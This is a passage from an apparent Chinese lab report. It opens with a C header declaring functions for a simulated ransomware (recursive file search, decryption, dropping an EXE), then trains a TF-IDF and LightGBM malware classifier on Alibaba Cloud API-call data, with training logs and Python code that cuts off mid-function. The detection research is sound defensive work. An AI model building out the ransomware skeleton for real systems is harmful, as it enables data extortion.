  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#pragma once</span><br><span class="line">#pragma warning(disable : 4996)</span><br><span class="line"></span><br><span class="line">// 在指定路径下递归寻找所有文件</span><br><span class="line">void findFile(char* pathName);</span><br><span class="line"></span><br><span class="line">// 解密操作</span><br><span class="line">void deCode(char* pathFile);</span><br><span class="line">int dropEXE(char* fpSrc, char* fpDst);</span><br></pre></td></tr></table></figure>
  <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000517248.png" class="" title="image-20241213000517248">
  <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000536557.png" class="" title="image-20241213000536557">
  <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213000633707.png" class="" title="image-20241213000633707">
<h4 id="第二部分：基于机器学习的恶意程序检测"><a href="#第二部分：基于机器学习的恶意程序检测" class="headerlink" title="第二部分：基于机器学习的恶意程序检测"></a>第二部分：基于机器学习的恶意程序检测</h4><p>恶意软件是一种被设计用来对目标计算机造成破坏或占用目标计算机资源的软件，包括蠕虫、木马、勒索病毒等。近年来，随着虚拟货币的流行，挖矿类恶意程序也大规模出现，严重侵害用户利益。通过结合机器学习和深度学习技术，能够有效提高恶意程序的检测率和泛化能力。</p>
<p>本实验以<a target="_blank" rel="noopener" href="https://tianchi.aliyun.com/competition/entrance/231694/information">阿里云安全恶意程序检测竞赛</a>提供的恶意程序检测数据集为基础，探索恶意程序检测的多种方法，包括：</p>
<ol>
<li>模拟勒索病毒行为。</li>
<li>基于机器学习的恶意程序检测。</li>
<li>基于深度学习的恶意程序分类。</li>
</ol>
<h5 id="数据集介绍："><a href="#数据集介绍：" class="headerlink" title="数据集介绍："></a>数据集介绍：</h5><p>阿里云安全恶意程序检测数据集 (<a target="_blank" rel="noopener" href="https://tianchi.aliyun.com/dataset/137262">阿里云数据集</a>)</p>
<p>本次实验使用的数据集由阿里云提供，包含从沙箱模拟运行后的Windows可执行程序API调用序列。数据总计约6亿条，包括多种恶意程序类型和正常文件的数据。数据集主要特点和内容如下：</p>
<h6 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1. 数据结构"></a><strong>1. 数据结构</strong></h6><div class="table-container">
<table>
<thead>
<tr>
<th>字段名称</th>
<th>数据类型</th>
<th style="text-align:left">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>file_id</code></td>
<td><code>bigint</code></td>
<td style="text-align:left">文件编号</td>
</tr>
<tr>
<td><code>label</code></td>
<td><code>bigint</code></td>
<td style="text-align:left">文件标签：0（正常）、1（勒索病毒）、2（挖矿程序）、3（DDoS木马）、4（蠕虫病毒）、5（感染型病毒）、6（后门程序）、7（木马程序）</td>
</tr>
<tr>
<td><code>api</code></td>
<td><code>string</code></td>
<td style="text-align:left">文件调用的API名称</td>
</tr>
<tr>
<td><code>tid</code></td>
<td><code>bigint</code></td>
<td style="text-align:left">调用API的线程编号</td>
</tr>
<tr>
<td><code>return_value</code></td>
<td><code>string</code></td>
<td style="text-align:left">API返回值</td>
</tr>
<tr>
<td><code>index</code></td>
<td><code>string</code></td>
<td style="text-align:left">API调用的顺序编号，在同线程中保证顺序，但不同线程之间无顺序关系</td>
</tr>
</tbody>
</table>
</div>
<h6 id="2-数据规模"><a href="#2-数据规模" class="headerlink" title="2. 数据规模"></a><strong>2. 数据规模</strong></h6><ul>
<li>训练数据：约9000万次调用，文件1万多个（以文件编号汇总）。</li>
<li>测试数据：约8000万次调用，包含约1万个文件。</li>
<li>每个文件中的API调用可能超过5000条，超出部分已截断。</li>
</ul>
<h6 id="3-数据预处理"><a href="#3-数据预处理" class="headerlink" title="3. 数据预处理"></a><strong>3. 数据预处理</strong></h6><ul>
<li>数据均已脱敏，确保隐私和安全。</li>
<li>每条记录包含完整的调用上下文及线程信息，有助于模型捕获程序行为特征。</li>
</ul>
<h6 id="4-评测指标"><a href="#4-评测指标" class="headerlink" title="4. 评测指标"></a><strong>4. 评测指标</strong></h6><p>使用LogLoss（对数损失）作为评测指标：</p>
<p>$\text{logloss} = -\frac{1}{N} \sum<em>{i=1}^N \sum</em>{j=1}^M \left[ y<em>{ij} \log(P</em>{ij}) + (1 - y<em>{ij}) \log(1 - P</em>{ij}) \right]$</p>
<p>其中：</p>
<ul>
<li><strong>$M$</strong>：表示分类数（总共6个类别）。</li>
<li><strong>$N$</strong>：表示测试集样本总数。</li>
<li><strong>$y_{ij}$</strong>：第$i$个样本是否属于第$j$类（是-1，否-0）。</li>
<li><strong>$P_{ij}$</strong>：第$i$个样本被预测为第$j$类的概率（如：prob0, prob1, prob2, prob3, prob4, prob5 ,prob6,prob7）。</li>
</ul>
<h5 id="实验方法"><a href="#实验方法" class="headerlink" title="实验方法"></a><strong>实验方法</strong></h5><ol>
<li>特征提取：<ul>
<li>将恶意软件的数据格式化，主要包括API调用序列、线程信息等。</li>
<li>统一数据的API字段编码，使用LabelEncoder为API字段生成整数值，便于模型处理。</li>
<li>对API调用序列长度进行填充/截断（最大长度设为5000）。</li>
<li>基于TF-IDF对API调用文本进行特征提取。</li>
</ul>
</li>
<li>模型训练：<ul>
<li>使用TF-IDF提取特征，结合LightGBM分类模型。</li>
<li>TF-IDF使用一元和二元词组，特征数量限制为1000。</li>
<li>使用5折交叉验证评估模型性能。</li>
</ul>
</li>
</ol>
<h5 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a><strong>实验结果</strong></h5><ol>
<li>代码实现：<ul>
<li>特征提取：基于TF-IDF的API序列向量化。</li>
<li>模型训练：使用LightGBM进行多分类任务。</li>
</ul>
</li>
<li>性能表现：<ul>
<li>平均验证集准确率：<strong>90.24%</strong>。</li>
<li>每折交叉验证的准确率分布：<ul>
<li>折1：90.82%</li>
<li>折2：89.67%</li>
<li>折3：90.49%</li>
<li>折4：89.41%</li>
<li>折5：90.78%</li>
</ul>
</li>
</ul>
</li>
<li>特征贡献：<ul>
<li>TF-IDF特征对模型贡献显著，尤其是高频API组合。线程相关统计特征如调用次数、API分布等也显著提升了分类效果。</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">PS D:\chen_hao\病毒检测机器学习&gt; &amp; D:/ProgramSoftware/anaconda3/python.exe d:/chen_hao/病毒检测机器学习/TF-IDF_LightGBM.py</span><br><span class="line">检查GPU状态...</span><br><span class="line">GPU 检查失败，将使用 CPU 模式: module &#x27;lightgbm&#x27; has no attribute &#x27;get_gpu_device_count&#x27;</span><br><span class="line">读取训练数据...</span><br><span class="line">读取测试数据...</span><br><span class="line">训练数据形状: (89806693, 5)</span><br><span class="line">测试数据形状: (79288375, 4)</span><br><span class="line">准备训练数据...</span><br><span class="line">编码标签...</span><br><span class="line">原始标签分布:</span><br><span class="line">label</span><br><span class="line">5    33033543</span><br><span class="line">0    16375107</span><br><span class="line">7    15081535</span><br><span class="line">2     9693969</span><br><span class="line">3     8117585</span><br><span class="line">6     4586578</span><br><span class="line">1     2254561</span><br><span class="line">4      663815</span><br><span class="line">Name: count, dtype: int64</span><br><span class="line">标签映射:</span><br><span class="line">&#123;0: 0, 1: 1, 2: 2, 3: 3, 4: 4, 5: 5, 6: 6, 7: 7&#125;</span><br><span class="line">提取基础统计特征...</span><br><span class="line">计算基础聚合特征...</span><br><span class="line">计算API序列特征...</span><br><span class="line">计算线程特征...</span><br><span class="line">提取TF-IDF特征...</span><br><span class="line">准备API序列...</span><br><span class="line">训练TF-IDF向量化器...</span><br><span class="line">开始5折交叉验证训练...</span><br><span class="line"></span><br><span class="line">训练折数 1/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.267747</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[103]   valid_0&#x27;s multi_logloss: 0.267092</span><br><span class="line">Fold 1 验证集准确率: 0.9082</span><br><span class="line"></span><br><span class="line">训练折数 2/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.315787</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[93]    valid_0&#x27;s multi_logloss: 0.314403</span><br><span class="line">Fold 2 验证集准确率: 0.8967</span><br><span class="line"></span><br><span class="line">训练折数 3/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.299846</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[88]    valid_0&#x27;s multi_logloss: 0.298147</span><br><span class="line">Fold 3 验证集准确率: 0.9049</span><br><span class="line"></span><br><span class="line">训练折数 4/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.331149</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[83]    valid_0&#x27;s multi_logloss: 0.328906</span><br><span class="line">Fold 4 验证集准确率: 0.8941</span><br><span class="line"></span><br><span class="line">训练折数 5/5</span><br><span class="line">Training until validation scores don&#x27;t improve for 50 rounds</span><br><span class="line">[100]   valid_0&#x27;s multi_logloss: 0.292818</span><br><span class="line">Early stopping, best iteration is:</span><br><span class="line">[95]    valid_0&#x27;s multi_logloss: 0.291777</span><br><span class="line">Fold 5 验证集准确率: 0.9078</span><br><span class="line"></span><br><span class="line">平均验证集准确率: 0.9024</span><br><span class="line">生成预测结果...</span><br><span class="line">准备测试数据...</span><br><span class="line">编码标签...</span><br><span class="line">提取基础统计特征...</span><br><span class="line">计算基础聚合特征...</span><br><span class="line">计算API序列特征...</span><br><span class="line">计算线程特征...</span><br><span class="line">提取TF-IDF特征...</span><br><span class="line">准备API序列...</span><br><span class="line">生成预测...</span><br><span class="line">保存预测结果...</span><br><span class="line">完成!</span><br></pre></td></tr></table></figure>
<img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212110923814.png" class="" title="image-20241212110923814">
<img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212110951238.png" class="" title="image-20241212110951238">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line">from sklearn.metrics import accuracy_score</span><br><span class="line">from sklearn.feature_extraction.text import TfidfVectorizer</span><br><span class="line">from sklearn.model_selection import train_test_split, StratifiedKFold</span><br><span class="line">import lightgbm as lgb</span><br><span class="line">import warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(&#x27;ignore&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_gpu():</span><br><span class="line">    &quot;&quot;&quot;检查GPU是否可用&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lgb_version = lgb.__version__</span><br><span class="line">        is_gpu_available = lgb.get_gpu_device_count() &gt; 0</span><br><span class="line">        print(f&quot;LightGBM 版本: &#123;lgb_version&#125;&quot;)</span><br><span class="line">        print(f&quot;GPU 可用: &#123;is_gpu_available&#125;&quot;)</span><br><span class="line">        if is_gpu_available:</span><br><span class="line">            print(f&quot;可用 GPU 数量: &#123;lgb.get_gpu_device_count()&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;GPU 检查失败，将使用 CPU 模式: &#123;e&#125;&quot;)</span><br><span class="line">        return False</span><br><span class="line">    return is_gpu_available</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def optimize_dtypes(df):</span><br><span class="line">    &quot;&quot;&quot;优化数据类型以减少内存使用&quot;&quot;&quot;</span><br><span class="line">    for col in df.columns:</span><br><span class="line">        if df[col].dtype == &#x27;float64&#x27;:</span><br><span class="line">            df[col] = df[col].astype(&#x27;float32&#x27;)</span><br><span class="line">        elif df[col].dtype == &#x27;int64&#x27;:</span><br><span class="line">            df[col] = df[col].astype(&#x27;int32&#x27;)</span><br><span class="line">    return df</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MalwareClassifier:</span><br><span class="line">    def __init__(self, use_gpu=True):</span><br><span class="line">        self.tfidf = None</span><br><span class="line">        self.models = None</span><br><span class="line">        self.feature_importances = None</span><br><span class="line">        self.use_gpu = use_gpu</span><br><span class="line">        self.label_map = None</span><br><span class="line"></span><br><span class="line">    def _encode_labels(self, train_data=None, test_data=None):</span><br><span class="line">        &quot;&quot;&quot;标签编码&quot;&quot;&quot;</span><br><span class="line">        if train_data is not None and &#x27;label&#x27; in train_data.columns:</span><br><span class="line">            print(&quot;原始标签分布:&quot;)</span><br><span class="line">            print(train_data[&#x27;label&#x27;].value_counts())</span><br><span class="line">            unique_labels = sorted(train_data[&#x27;label&#x27;].unique())</span><br><span class="line">            self.label_map = &#123;label: idx for idx, label in enumerate(unique_labels)&#125;</span><br><span class="line">            print(&quot;标签映射:&quot;)</span><br><span class="line">            print(self.label_map)</span><br><span class="line">            train_data[&#x27;label&#x27;] = train_data[&#x27;label&#x27;].map(self.label_map)</span><br><span class="line"></span><br><span class="line">        if test_data is not None and &#x27;label&#x27; in test_data.columns:</span><br><span class="line">            test_data[&#x27;label&#x27;] = test_data[&#x27;label&#x27;].map(self.label_map)</span><br><span class="line"></span><br><span class="line">        return train_data, test_data</span><br><span class="line"></span><br><span class="line">    def prepare_features(self, train_data=None, test_data=None):</span><br><span class="line">        &quot;&quot;&quot;准备所有特征&quot;&quot;&quot;</span><br><span class="line">        print(&quot;编码标签...&quot;)</span><br><span class="line">        train_data, test_data = self._encode_labels(train_data, test_data)</span><br><span class="line"></span><br><span class="line">        if train_data is not None:</span><br><span class="line">            print(&quot;提取基础统计特征...&quot;)</span><br><span class="line">            train_stats = self._extract_basic_stats(train_data)</span><br><span class="line">            print(&quot;提取TF-IDF特征...&quot;)</span><br><span class="line">            if test_data is not None:</span><br><span class="line">                train_tfidf, test_tfidf = self._extract_tfidf_features(train_data, test_data)</span><br><span class="line">                test_stats = self._extract_basic_stats(test_data)</span><br><span class="line">                train_features = pd.merge(train_stats, train_tfidf, on=&#x27;file_id&#x27;)</span><br><span class="line">                test_features = pd.merge(test_stats, test_tfidf, on=&#x27;file_id&#x27;)</span><br><span class="line">                return train_features, test_features</span><br><span class="line">            else:</span><br><span class="line">                train_tfidf = self._extract_tfidf_features(train_data)</span><br><span class="line">                return pd.merge(train_stats, train_tfidf, on=&#x27;file_id&#x27;)</span><br><span class="line">        elif test_data is not None:</span><br><span class="line">            print(&quot;提取基础统计特征...&quot;)</span><br><span class="line">            test_stats = self._extract_basic_stats(test_data)</span><br><span class="line">            print(&quot;提取TF-IDF特征...&quot;)</span><br><span class="line">            test_tfidf = self._extract_tfidf_features(test_data)</span><br><span class="line">            return pd.merge(test_stats, test_tfidf, on=&#x27;file_id&#x27;)</span><br><span class="line"></span><br><span class="line">    def _extract_basic_stats(self, data):</span><br><span class="line">        &quot;&quot;&quot;提取基础统计特征&quot;&quot;&quot;</span><br><span class="line">        if &#x27;label&#x27; in data.columns:</span><br><span class="line">            df = data.groupby(&#x27;file_id&#x27;)[&#x27;label&#x27;].first().reset_index()</span><br><span class="line">        else:</span><br><span class="line">            df = pd.DataFrame(&#123;&#x27;file_id&#x27;: data[&#x27;file_id&#x27;].unique()&#125;)</span><br><span class="line"></span><br><span class="line">        print(&quot;计算基础聚合特征...&quot;)</span><br><span class="line">        agg_features = data.groupby(&#x27;file_id&#x27;).agg(&#123;</span><br><span class="line">            &#x27;api&#x27;: [&#x27;count&#x27;, &#x27;nunique&#x27;],</span><br><span class="line">            &#x27;tid&#x27;: &#x27;nunique&#x27;,</span><br><span class="line">            &#x27;index&#x27;: [&#x27;min&#x27;, &#x27;max&#x27;, &#x27;mean&#x27;, &#x27;std&#x27;]</span><br><span class="line">        &#125;).reset_index()</span><br><span class="line">        agg_features.columns = [&#x27;file_id&#x27;, &#x27;api_calls&#x27;, &#x27;unique_apis&#x27;,</span><br><span class="line">                                &#x27;thread_count&#x27;, &#x27;min_index&#x27;, &#x27;max_index&#x27;,</span><br><span class="line">                                &#x27;mean_index&#x27;, &#x27;std_index&#x27;]</span><br><span class="line"></span><br><span class="line">        df = pd.merge(df, agg_features, on=&#x27;file_id&#x27;, how=&#x27;left&#x27;)</span><br><span class="line"></span><br><span class="line">        print(&quot;计算API序列特征...&quot;)</span><br><span class="line">        api_counts = data.groupby([&#x27;file_id&#x27;, &#x27;api&#x27;]).size().reset_index(name=&#x27;api_freq&#x27;)</span><br><span class="line">        top_apis = api_counts.groupby(&#x27;file_id&#x27;)[&#x27;api_freq&#x27;].agg([&#x27;max&#x27;, &#x27;mean&#x27;]).reset_index()</span><br><span class="line">        top_apis.columns = [&#x27;file_id&#x27;, &#x27;max_api_freq&#x27;, &#x27;mean_api_freq&#x27;]</span><br><span class="line"></span><br><span class="line">        df = pd.merge(df, top_apis, on=&#x27;file_id&#x27;, how=&#x27;left&#x27;)</span><br><span class="line"></span><br><span class="line">        print(&quot;计算线程特征...&quot;)</span><br><span class="line">        thread_stats = data.groupby([&#x27;file_id&#x27;, &#x27;tid&#x27;]).size().reset_index(name=&#x27;apis_per_thread&#x27;)</span><br><span class="line">        thread_agg = thread_stats.groupby(&#x27;file_id&#x27;)[&#x27;apis_per_thread&#x27;].agg([&#x27;mean&#x27;, &#x27;std&#x27;, &#x27;max&#x27;]).reset_index()</span><br><span class="line">        thread_agg.columns = [&#x27;file_id&#x27;, &#x27;mean_apis_per_thread&#x27;, &#x27;std_apis_per_thread&#x27;, &#x27;max_apis_per_thread&#x27;]</span><br><span class="line"></span><br><span class="line">        df = pd.merge(df, thread_agg, on=&#x27;file_id&#x27;, how=&#x27;left&#x27;)</span><br><span class="line"></span><br><span class="line">        df[&#x27;unique_api_ratio&#x27;] = df[&#x27;unique_apis&#x27;] / (df[&#x27;api_calls&#x27;] + 1)</span><br><span class="line">        df[&#x27;api_per_thread_ratio&#x27;] = df[&#x27;api_calls&#x27;] / (df[&#x27;thread_count&#x27;] + 1)</span><br><span class="line"></span><br><span class="line">        df = df.fillna(0)</span><br><span class="line">        return df</span><br><span class="line"></span><br><span class="line">    def _extract_tfidf_features(self, train_data, test_data=None):</span><br><span class="line">        def prepare_api_sequence(data):</span><br><span class="line">            return data.groupby(&#x27;file_id&#x27;).agg(&#123;</span><br><span class="line">                &#x27;api&#x27;: lambda x: &#x27; &#x27;.join(x.astype(str))</span><br><span class="line">            